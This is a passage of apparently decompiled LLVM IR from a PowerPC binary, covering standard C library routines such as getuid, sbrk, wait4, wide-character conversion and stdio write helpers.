  uselistorder label %dec_label_pc_10010fb0, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010fdc = call i32 @__asm_mfcr()
  %v1_10010fe0 = and i32 %v0_10010fdc, 268435456
  %v3_10010fe0 = icmp eq i32 %v1_10010fe0, 0
  store i32 %v0_10010fdc, i32* %r31.global-to-local, align 4
  br i1 %v3_10010fe0, label %dec_label_pc_10010ff8, label %dec_label_pc_10010fec

dec_label_pc_10010fec:                            ; preds = %entry
  %v0_10010fec = call i32 @__errno_location()
  %v0_10010ff0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010ff0 = inttoptr i32 %v0_10010fec to i32*
  store i32 %v0_10010ff0, i32* %v2_10010ff0, align 4
  br label %dec_label_pc_10010ff8

dec_label_pc_10010ff8:                            ; preds = %entry, %dec_label_pc_10010fec
  %v0_10011008 = phi i32 [ %v0_10010fdc, %entry ], [ -1, %dec_label_pc_10010fec ]
  ret i32 %v0_10011008

; uselistorder directives
  uselistorder label %dec_label_pc_10010ff8, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011024 = call i32 @__asm_mfcr()
  %v1_10011028 = and i32 %v0_10011024, 268435456
  %v3_10011028 = icmp eq i32 %v1_10011028, 0
  store i32 %v0_10011024, i32* %r31.global-to-local, align 4
  br i1 %v3_10011028, label %dec_label_pc_10011040, label %dec_label_pc_10011034

dec_label_pc_10011034:                            ; preds = %entry
  %v0_10011034 = call i32 @__errno_location()
  %v0_10011038 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011038 = inttoptr i32 %v0_10011034 to i32*
  store i32 %v0_10011038, i32* %v2_10011038, align 4
  br label %dec_label_pc_10011040

dec_label_pc_10011040:                            ; preds = %entry, %dec_label_pc_10011034
  %v0_10011050 = phi i32 [ %v0_10011024, %entry ], [ -1, %dec_label_pc_10011034 ]
  ret i32 %v0_10011050

; uselistorder directives
  uselistorder label %dec_label_pc_10011040, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10011070 = load i32, i32* @global_var_10028630.668, align 4
  %v3_10011074 = icmp eq i32 %v3_10011070, 0
  br i1 %v3_10011074, label %dec_label_pc_1001107c, label %dec_label_pc_10011088

dec_label_pc_1001107c:                            ; preds = %entry
  store i32 268505216, i32* @lr, align 4
  %v1_1001107c = call i32 @__GI_brk(i32 0)
  %v1_10011080 = icmp slt i32 %v1_1001107c, 0
  br i1 %v1_10011080, label %dec_label_pc_100110a8, label %dec_label_pc_1001107c.dec_label_pc_10011088_crit_edge

dec_label_pc_1001107c.dec_label_pc_10011088_crit_edge: ; preds = %dec_label_pc_1001107c
  %v0_10011088.pre = load i32, i32* @r30, align 4
  %v3_1001108c.pre = load i32, i32* @global_var_10028630.668, align 4
  br label %dec_label_pc_10011088

dec_label_pc_10011088:                            ; preds = %dec_label_pc_1001107c.dec_label_pc_10011088_crit_edge, %entry
  %v3_1001108c = phi i32 [ %v3_1001108c.pre, %dec_label_pc_1001107c.dec_label_pc_10011088_crit_edge ], [ %v3_10011070, %entry ]
  %v1_10011094 = phi i32 [ %v0_10011088.pre, %dec_label_pc_1001107c.dec_label_pc_10011088_crit_edge ], [ %arg1, %entry ]
  %v3_10011088 = icmp eq i32 %v1_10011094, 0
  store i32 %v3_1001108c, i32* @r31, align 4
  br i1 %v3_10011088, label %dec_label_pc_100110ac, label %dec_label_pc_1001109c

dec_label_pc_1001109c:                            ; preds = %dec_label_pc_10011088
  %v2_10011094 = add i32 %v1_10011094, %v3_1001108c
  store i32 268505248, i32* @lr, align 4
  %v1_1001109c = call i32 @__GI_brk(i32 %v2_10011094)
  %tmp6 = icmp sgt i32 %v1_1001109c, -1
  br i1 %tmp6, label %dec_label_pc_1001109c.dec_label_pc_100110ac_crit_edge, label %dec_label_pc_100110a8

dec_label_pc_1001109c.dec_label_pc_100110ac_crit_edge: ; preds = %dec_label_pc_1001109c
  %v0_100110b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100110ac

dec_label_pc_100110a8:                            ; preds = %dec_label_pc_1001109c, %dec_label_pc_1001107c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_100110ac

dec_label_pc_100110ac:                            ; preds = %dec_label_pc_1001109c.dec_label_pc_100110ac_crit_edge, %dec_label_pc_10011088, %dec_label_pc_100110a8
  %v0_100110b0 = phi i32 [ %v0_100110b0.pre, %dec_label_pc_1001109c.dec_label_pc_100110ac_crit_edge ], [ %v3_1001108c, %dec_label_pc_10011088 ], [ -1, %dec_label_pc_100110a8 ]
  ret i32 %v0_100110b0

; uselistorder directives
  uselistorder i32 %v3_1001108c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_100110ac, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100110dc = call i32 @__asm_mfcr()
  %v1_100110e0 = and i32 %v0_100110dc, 268435456
  %v3_100110e0 = icmp eq i32 %v1_100110e0, 0
  store i32 %v0_100110dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100110e0, label %dec_label_pc_100110f8, label %dec_label_pc_100110ec

dec_label_pc_100110ec:                            ; preds = %entry
  %v0_100110ec = call i32 @__errno_location()
  %v0_100110f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100110f0 = inttoptr i32 %v0_100110ec to i32*
  store i32 %v0_100110f0, i32* %v2_100110f0, align 4
  br label %dec_label_pc_100110f8

dec_label_pc_100110f8:                            ; preds = %entry, %dec_label_pc_100110ec
  %v0_10011108 = phi i32 [ %v0_100110dc, %entry ], [ -1, %dec_label_pc_100110ec ]
  ret i32 %v0_10011108

; uselistorder directives
  uselistorder label %dec_label_pc_100110f8, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10028614.669 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10011118 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_10011134 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10011134, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10011118, label %dec_label_pc_10011140, label %dec_label_pc_10011148

dec_label_pc_10011140:                            ; preds = %entry
  %v2_10011140 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10011140, i32* @r3, align 4
  br label %dec_label_pc_10011148

dec_label_pc_10011148:                            ; preds = %entry, %dec_label_pc_10011140
  %v0_1001114c = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10011140 ]
  %v2_10011148 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1001114c, i32* %stack_var_-40, align 4
  store i32 %v2_10011148, i32* %stack_var_-36, align 4
  store i32 268505432, i32* @lr, align 4
  %v0_10011154 = call i32 @__GI_wcsnrtombs()
  %v3_10011158 = icmp eq i32 %v0_10011154, 0
  br i1 %v3_10011158, label %dec_label_pc_10011160, label %dec_label_pc_10011164

dec_label_pc_10011160:                            ; preds = %dec_label_pc_10011148
  br label %dec_label_pc_10011164

dec_label_pc_10011164:                            ; preds = %dec_label_pc_10011148, %dec_label_pc_10011160
  %v0_10011170 = phi i32 [ %v0_10011154, %dec_label_pc_10011148 ], [ 1, %dec_label_pc_10011160 ]
  ret i32 %v0_10011170

; uselistorder directives
  uselistorder label %dec_label_pc_10011164, { 1, 0 }
  uselistorder label %dec_label_pc_10011148, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10011174 = load i32, i32* @r6, align 4
  store i32 %v0_10011174, i32* @r7, align 4
  %v0_10011178 = load i32, i32* @r5, align 4
  store i32 %v0_10011178, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10011180 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10011180

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10011184 = load i32, i32* @r3, align 4
  %v3_10011184 = icmp eq i32 %v0_10011184, 0
  %v0_10011188 = load i32, i32* @lr, align 4
  store i32 %v0_10011188, i32* %r0.global-to-local, align 4
  br i1 %v3_10011184, label %dec_label_pc_100111b0, label %dec_label_pc_10011198

dec_label_pc_10011198:                            ; preds = %entry
  %v1_10011198 = load i32, i32* @r4, align 4
  %v4_10011198 = icmp eq i32 %v0_10011184, %v1_10011198
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011198, label %dec_label_pc_100111a4, label %dec_label_pc_100111dc

dec_label_pc_100111a4:                            ; preds = %dec_label_pc_10011198
  %v2_100111a8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100111a8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100111dc

dec_label_pc_100111b0:                            ; preds = %entry
  %v2_100111a811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100111a811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_100111dc

dec_label_pc_100111bc:                            ; preds = %dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge, %dec_label_pc_100111fc.preheader
  %v0_100111bc = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_100111c8 = inttoptr i32 %v0_100111bc to i32*
  store i32 84, i32* %v2_100111c8, align 4
  %v0_10011240.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001123c

dec_label_pc_100111d0:                            ; preds = %dec_label_pc_1001120c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001122c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011228

dec_label_pc_100111dc:                            ; preds = %dec_label_pc_100111a4, %dec_label_pc_10011198, %dec_label_pc_100111b0
  %v2_1001120c7 = phi i32 [ %v2_100111a8, %dec_label_pc_100111a4 ], [ %v0_10011184, %dec_label_pc_10011198 ], [ %v2_100111a811, %dec_label_pc_100111b0 ]
  %v0_100111dc = load i32, i32* @r5, align 4
  %v1_100111dc = load i32, i32* @r6, align 4
  %v3_100111dc = icmp ugt i32 %v0_100111dc, %v1_100111dc
  br i1 %v3_100111dc, label %dec_label_pc_100111e4, label %dec_label_pc_100111e8

dec_label_pc_100111e4:                            ; preds = %dec_label_pc_100111dc
  store i32 %v1_100111dc, i32* @r5, align 4
  br label %dec_label_pc_100111e8

dec_label_pc_100111e8:                            ; preds = %dec_label_pc_100111dc, %dec_label_pc_100111e4
  %v0_100111f4 = phi i32 [ %v0_100111dc, %dec_label_pc_100111dc ], [ %v1_100111dc, %dec_label_pc_100111e4 ]
  %v1_100111e8 = add i32 %v0_100111f4, 1
  store i32 %v1_100111e8, i32* %r0.global-to-local, align 4
  %v0_100111ec = load i32, i32* @r4, align 4
  %v1_100111ec = inttoptr i32 %v0_100111ec to i32*
  %v2_100111ec = load i32, i32* %v1_100111ec, align 4
  store i32 %v2_100111ec, i32* %r11.global-to-local, align 4
  store i32 %v0_100111f4, i32* %r9.global-to-local, align 4
  store i32 %v0_100111f4, i32* %ctr.global-to-local, align 4
  %v2_100112243 = icmp eq i32 %v0_100111f4, 0
  br i1 %v2_100112243, label %dec_label_pc_10011228, label %dec_label_pc_100111fc.preheader

dec_label_pc_100111fc.preheader:                  ; preds = %dec_label_pc_100111e8
  %v1_100111fc16 = inttoptr i32 %v2_100111ec to i32*
  %v2_100111fc17 = load i32, i32* %v1_100111fc16, align 4
  store i32 %v2_100111fc17, i32* %r0.global-to-local, align 4
  %v1_1001120018 = add i32 %v2_100111ec, 4
  store i32 %v1_1001120018, i32* %r11.global-to-local, align 4
  %v2_1001120420 = icmp ugt i32 %v2_100111fc17, 127
  br i1 %v2_1001120420, label %dec_label_pc_100111bc, label %dec_label_pc_1001120c.lr.ph

dec_label_pc_1001120c.lr.ph:                      ; preds = %dec_label_pc_100111fc.preheader
  %extract.t = trunc i32 %v2_100111fc17 to i8
  br label %dec_label_pc_1001120c

dec_label_pc_1001120c:                            ; preds = %dec_label_pc_1001120c.lr.ph, %dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge
  %v2_100111fc23.off0 = phi i8 [ %extract.t, %dec_label_pc_1001120c.lr.ph ], [ %extract.t24, %dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge ]
  %v2_1001120c22 = phi i32 [ %v2_1001120c7, %dec_label_pc_1001120c.lr.ph ], [ %v2_1001121c, %dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge ]
  %v3_1001120c = inttoptr i32 %v2_1001120c22 to i8*
  store i8 %v2_100111fc23.off0, i8* %v3_1001120c, align 1
  %v0_10011210 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011210 = urem i32 %v0_10011210, 256
  store i32 %v1_10011210, i32* %r0.global-to-local, align 4
  %v3_10011214 = icmp eq i32 %v1_10011210, 0
  br i1 %v3_10011214, label %dec_label_pc_100111d0, label %dec_label_pc_1001121c

dec_label_pc_1001121c:                            ; preds = %dec_label_pc_1001120c
  %v0_1001121c = load i32, i32* @r3, align 4
  %v1_1001121c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001121c = add i32 %v1_1001121c, %v0_1001121c
  store i32 %v2_1001121c, i32* @r3, align 4
  %v0_10011220 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011220 = add i32 %v0_10011220, -1
  store i32 %v1_10011220, i32* %r9.global-to-local, align 4
  %v0_10011224 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011224 = add i32 %v0_10011224, -1
  store i32 %v1_10011224, i32* %ctr.global-to-local, align 4
  %v2_10011224 = icmp eq i32 %v1_10011224, 0
  br i1 %v2_10011224, label %dec_label_pc_10011228, label %dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge

dec_label_pc_1001121c.dec_label_pc_100111fc_crit_edge: ; preds = %dec_label_pc_1001121c
  %v0_100111fc.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100111fc = inttoptr i32 %v0_100111fc.pre to i32*
  %v2_100111fc = load i32, i32* %v1_100111fc, align 4
  store i32 %v2_100111fc, i32* %r0.global-to-local, align 4
  %v1_10011200 = add i32 %v0_100111fc.pre, 4
  store i32 %v1_10011200, i32* %r11.global-to-local, align 4
  %v2_10011204 = icmp ugt i32 %v2_100111fc, 127
  %extract.t24 = trunc i32 %v2_100111fc to i8
  br i1 %v2_10011204, label %dec_label_pc_100111bc, label %dec_label_pc_1001120c

dec_label_pc_10011228:                            ; preds = %dec_label_pc_1001121c, %dec_label_pc_100111e8, %dec_label_pc_100111d0
  %v0_1001122c = phi i32 [ %v0_1001122c.pre, %dec_label_pc_100111d0 ], [ %v2_1001120c7, %dec_label_pc_100111e8 ], [ %v2_1001121c, %dec_label_pc_1001121c ]
  %v2_10011228 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011228, i32* %r0.global-to-local, align 4
  %v4_1001122c = icmp eq i32 %v0_1001122c, %v2_10011228
  br i1 %v4_1001122c, label %dec_label_pc_10011238, label %dec_label_pc_10011234

dec_label_pc_10011234:                            ; preds = %dec_label_pc_10011228
  %v0_10011234 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011234 = load i32, i32* @r4, align 4
  %v2_10011234 = inttoptr i32 %v1_10011234 to i32*
  store i32 %v0_10011234, i32* %v2_10011234, align 4
  br label %dec_label_pc_10011238

dec_label_pc_10011238:                            ; preds = %dec_label_pc_10011228, %dec_label_pc_10011234
  %v0_10011238 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011238 = load i32, i32* @r5, align 4
  %v2_10011238 = sub i32 %v1_10011238, %v0_10011238
  store i32 %v2_10011238, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001123c

dec_label_pc_1001123c:                            ; preds = %dec_label_pc_100111bc, %dec_label_pc_10011238
  %v0_10011240 = phi i32 [ %v0_10011240.pre, %dec_label_pc_100111bc ], [ %v2_10011238, %dec_label_pc_10011238 ]
  store i32 %v0_10011188, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011240

; uselistorder directives
  uselistorder i32 %v1_10011224, { 1, 0 }
  uselistorder i32 %v2_1001121c, { 0, 2, 1 }
  uselistorder i32 %v1_10011210, { 1, 0 }
  uselistorder i32 %v0_100111f4, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1001120c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 1, 3, 5, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 7, 8, 5, 3, 6 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder label %dec_label_pc_1001123c, { 1, 0 }
  uselistorder label %dec_label_pc_10011238, { 1, 0 }
  uselistorder label %dec_label_pc_1001120c, { 1, 0 }
  uselistorder label %dec_label_pc_100111e8, { 1, 0 }
  uselistorder label %dec_label_pc_100111dc, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10011250 = load i32, i32* @lr, align 4
  store i32 %v0_10011250, i32* %r0.global-to-local, align 4
  %v0_1001125c = load i32, i32* @r5, align 4
  store i32 %v0_1001125c, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1001125c, i32* @r31, align 4
  %v3_100112703 = icmp eq i32 %v0_1001125c, 0
  store i32 %v0_1001125c, i32* @r27, align 4
  br i1 %v3_100112703, label %dec_label_pc_10011318, label %dec_label_pc_10011280

dec_label_pc_10011280:                            ; preds = %entry, %dec_label_pc_100112a0
  %v0_10011290 = phi i32 [ %v2_100112a0, %dec_label_pc_100112a0 ], [ %arg2, %entry ]
  %v1_10011280.in = phi i32 [ %v2_100112a4, %dec_label_pc_100112a0 ], [ %v0_1001125c, %entry ]
  %v1_10011280 = icmp sgt i32 %v1_10011280.in, 0
  br i1 %v1_10011280, label %dec_label_pc_1001128c, label %dec_label_pc_10011284

dec_label_pc_10011284:                            ; preds = %dec_label_pc_10011280
  br label %dec_label_pc_1001128c

dec_label_pc_1001128c:                            ; preds = %dec_label_pc_10011280, %dec_label_pc_10011284
  %v0_1001128c = load i32, i32* @r30, align 4
  %v1_1001128c = add i32 %v0_1001128c, 4
  %v2_1001128c = inttoptr i32 %v1_1001128c to i32*
  %v3_1001128c = load i32, i32* %v2_1001128c, align 4
  store i32 268505752, i32* @lr, align 4
  %v3_10011294 = call i32 @__libc_write(i32 %v3_1001128c, i32 %v0_10011290)
  %v1_10011298 = icmp slt i32 %v3_10011294, 0
  br i1 %v1_10011298, label %dec_label_pc_100112ac, label %dec_label_pc_100112a0

dec_label_pc_100112a0:                            ; preds = %dec_label_pc_1001128c
  %v0_100112a0 = load i32, i32* @r29, align 4
  %v2_100112a0 = add i32 %v0_100112a0, %v3_10011294
  store i32 %v2_100112a0, i32* @r29, align 4
  %v1_100112a4 = load i32, i32* @r31, align 4
  %v2_100112a4 = sub i32 %v1_100112a4, %v3_10011294
  store i32 %v2_100112a4, i32* @r31, align 4
  %v3_10011270 = icmp eq i32 %v2_100112a4, 0
  store i32 %v2_100112a4, i32* @r27, align 4
  br i1 %v3_10011270, label %dec_label_pc_10011270.dec_label_pc_10011318.loopexit_crit_edge, label %dec_label_pc_10011280

dec_label_pc_100112ac:                            ; preds = %dec_label_pc_1001128c
  %v0_100112ac = load i32, i32* @r30, align 4
  %v1_100112ac = add i32 %v0_100112ac, 8
  %v2_100112ac = inttoptr i32 %v1_100112ac to i32*
  %v3_100112ac = load i32, i32* %v2_100112ac, align 4
  store i32 %v3_100112ac, i32* %r11.global-to-local, align 4
  %v1_100112b0 = add i32 %v0_100112ac, 12
  %v2_100112b0 = inttoptr i32 %v1_100112b0 to i32*
  %v3_100112b0 = load i32, i32* %v2_100112b0, align 4
  store i32 %v3_100112b0, i32* %r0.global-to-local, align 4
  %v1_100112b4 = inttoptr i32 %v0_100112ac to i16*
  %v2_100112b4 = load i16, i16* %v1_100112b4, align 2
  %v2_100112b8 = sub i32 %v3_100112b0, %v3_100112ac
  store i32 %v2_100112b8, i32* %r0.global-to-local, align 4
  %v5_100112b8 = icmp eq i32 %v2_100112b8, 0
  %v1_100112bc = or i16 %v2_100112b4, 8
  store i16 %v1_100112bc, i16* %v1_100112b4, align 2
  br i1 %v5_100112b8, label %dec_label_pc_100112ac.dec_label_pc_10011314_crit_edge, label %dec_label_pc_100112c8

dec_label_pc_100112ac.dec_label_pc_10011314_crit_edge: ; preds = %dec_label_pc_100112ac
  %v0_10011314.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011314

dec_label_pc_100112c8:                            ; preds = %dec_label_pc_100112ac
  %v0_100112c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100112c8 = load i32, i32* @r31, align 4
  %v3_100112c8 = icmp ugt i32 %v0_100112c8, %v1_100112c8
  br i1 %v3_100112c8, label %dec_label_pc_100112c8.dec_label_pc_100112d4_crit_edge, label %dec_label_pc_100112d0

dec_label_pc_100112c8.dec_label_pc_100112d4_crit_edge: ; preds = %dec_label_pc_100112c8
  %v0_100112d4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_100112d4

dec_label_pc_100112d0:                            ; preds = %dec_label_pc_100112c8
  store i32 %v0_100112c8, i32* @r27, align 4
  br label %dec_label_pc_100112d4

dec_label_pc_100112d4:                            ; preds = %dec_label_pc_100112c8.dec_label_pc_100112d4_crit_edge, %dec_label_pc_100112d0
  %v0_100112d4 = phi i32 [ %v0_100112d4.pre, %dec_label_pc_100112c8.dec_label_pc_100112d4_crit_edge ], [ %v0_100112c8, %dec_label_pc_100112d0 ]
  store i32 %v0_100112d4, i32* %ctr.global-to-local, align 4
  %v2_100112e0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100112d8

dec_label_pc_100112d8:                            ; preds = %dec_label_pc_100112fc, %dec_label_pc_100112d4
  %v2_100112e0 = phi i32 [ %v1_100112fc, %dec_label_pc_100112fc ], [ %v2_100112e0.pre, %dec_label_pc_100112d4 ]
  %v0_100112d8 = load i32, i32* @r29, align 4
  %v1_100112d8 = inttoptr i32 %v0_100112d8 to i8*
  %v2_100112d8 = load i8, i8* %v1_100112d8, align 1
  %v3_100112d8 = zext i8 %v2_100112d8 to i32
  store i32 %v3_100112d8, i32* %r0.global-to-local, align 4
  %v1_100112dc = add i32 %v0_100112d8, 1
  store i32 %v1_100112dc, i32* @r29, align 4
  %v3_100112e0 = inttoptr i32 %v2_100112e0 to i8*
  store i8 %v2_100112d8, i8* %v3_100112e0, align 1
  %v0_100112e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100112e4 = urem i32 %v0_100112e4, 256
  store i32 %v1_100112e4, i32* %r0.global-to-local, align 4
  %v3_100112e8 = icmp eq i32 %v1_100112e4, 10
  br i1 %v3_100112e8, label %dec_label_pc_100112f0, label %dec_label_pc_100112fc

dec_label_pc_100112f0:                            ; preds = %dec_label_pc_100112d8
  %v0_100112f0 = load i32, i32* @r30, align 4
  %v1_100112f0 = inttoptr i32 %v0_100112f0 to i16*
  %v2_100112f0 = load i16, i16* %v1_100112f0, align 2
  %v3_100112f0 = zext i16 %v2_100112f0 to i32
  store i32 %v3_100112f0, i32* %r0.global-to-local, align 4
  %v1_100112f4 = and i32 %v3_100112f0, 256
  %v3_100112f4 = icmp eq i32 %v1_100112f4, 0
  br i1 %v3_100112f4, label %dec_label_pc_100112fc, label %dec_label_pc_100112f0.dec_label_pc_10011304_crit_edge

dec_label_pc_100112f0.dec_label_pc_10011304_crit_edge: ; preds = %dec_label_pc_100112f0
  %v0_10011308.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011304

dec_label_pc_100112fc:                            ; preds = %dec_label_pc_100112f0, %dec_label_pc_100112d8
  %v0_100112fc = load i32, i32* %r11.global-to-local, align 4
  %v1_100112fc = add i32 %v0_100112fc, 1
  store i32 %v1_100112fc, i32* %r11.global-to-local, align 4
  %v0_10011300 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011300 = add i32 %v0_10011300, -1
  store i32 %v1_10011300, i32* %ctr.global-to-local, align 4
  %v2_10011300 = icmp eq i32 %v1_10011300, 0
  br i1 %v2_10011300, label %dec_label_pc_100112fc.dec_label_pc_10011304_crit_edge, label %dec_label_pc_100112d8

dec_label_pc_100112fc.dec_label_pc_10011304_crit_edge: ; preds = %dec_label_pc_100112fc
  %v0_10011304.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011304

dec_label_pc_10011304:                            ; preds = %dec_label_pc_100112f0.dec_label_pc_10011304_crit_edge, %dec_label_pc_100112fc.dec_label_pc_10011304_crit_edge
  %v0_10011308 = phi i32 [ %v1_100112fc, %dec_label_pc_100112fc.dec_label_pc_10011304_crit_edge ], [ %v0_10011308.pre, %dec_label_pc_100112f0.dec_label_pc_10011304_crit_edge ]
  %v0_10011304 = phi i32 [ %v0_10011304.pre, %dec_label_pc_100112fc.dec_label_pc_10011304_crit_edge ], [ %v0_100112f0, %dec_label_pc_100112f0.dec_label_pc_10011304_crit_edge ]
  %v1_10011304 = add i32 %v0_10011304, 8
  %v2_10011304 = inttoptr i32 %v1_10011304 to i32*
  %v3_10011304 = load i32, i32* %v2_10011304, align 4
  store i32 %v3_10011304, i32* %r0.global-to-local, align 4
  %v2_10011308 = add i32 %v0_10011304, 16
  %v3_10011308 = inttoptr i32 %v2_10011308 to i32*
  store i32 %v0_10011308, i32* %v3_10011308, align 4
  %v0_1001130c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001130c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001130c = sub i32 %v1_1001130c, %v0_1001130c
  store i32 %v2_1001130c, i32* %r0.global-to-local, align 4
  %v1_10011310 = load i32, i32* @r31, align 4
  %v2_10011310 = sub i32 %v1_10011310, %v2_1001130c
  store i32 %v2_10011310, i32* @r31, align 4
  br label %dec_label_pc_10011314

dec_label_pc_10011314:                            ; preds = %dec_label_pc_100112ac.dec_label_pc_10011314_crit_edge, %dec_label_pc_10011304
  %v0_10011314 = phi i32 [ %v0_10011314.pre, %dec_label_pc_100112ac.dec_label_pc_10011314_crit_edge ], [ %v2_10011310, %dec_label_pc_10011304 ]
  %v1_10011314 = load i32, i32* @r28, align 4
  %v2_10011314 = sub i32 %v1_10011314, %v0_10011314
  store i32 %v2_10011314, i32* @r28, align 4
  br label %dec_label_pc_10011318

dec_label_pc_10011270.dec_label_pc_10011318.loopexit_crit_edge: ; preds = %dec_label_pc_100112a0
  %v0_1001131c.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10011318

dec_label_pc_10011318:                            ; preds = %entry, %dec_label_pc_10011270.dec_label_pc_10011318.loopexit_crit_edge, %dec_label_pc_10011314
  %v0_1001131c = phi i32 [ %v2_10011314, %dec_label_pc_10011314 ], [ %v0_1001131c.pre.pre, %dec_label_pc_10011270.dec_label_pc_10011318.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10011250, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001131c

; uselistorder directives
  uselistorder i32 %v0_10011304, { 1, 0 }
  uselistorder i32 %v1_10011300, { 1, 0 }
  uselistorder i32 %v1_100112fc, { 0, 2, 1 }
  uselistorder i32 %v1_100112e4, { 1, 0 }
  uselistorder i32 %v2_100112a4, { 1, 3, 2, 0 }
  uselistorder i32 %v2_100112a0, { 1, 0 }
  uselistorder i32 %v3_10011294, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011318, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011314, { 1, 0 }
  uselistorder label %dec_label_pc_10011304, { 1, 0 }
  uselistorder label %dec_label_pc_100112d4, { 1, 0 }
  uselistorder label %dec_label_pc_1001128c, { 1, 0 }
  uselistorder label %dec_label_pc_10011280, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10011330 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1001134c = load i16, i16* %arg3, align 2
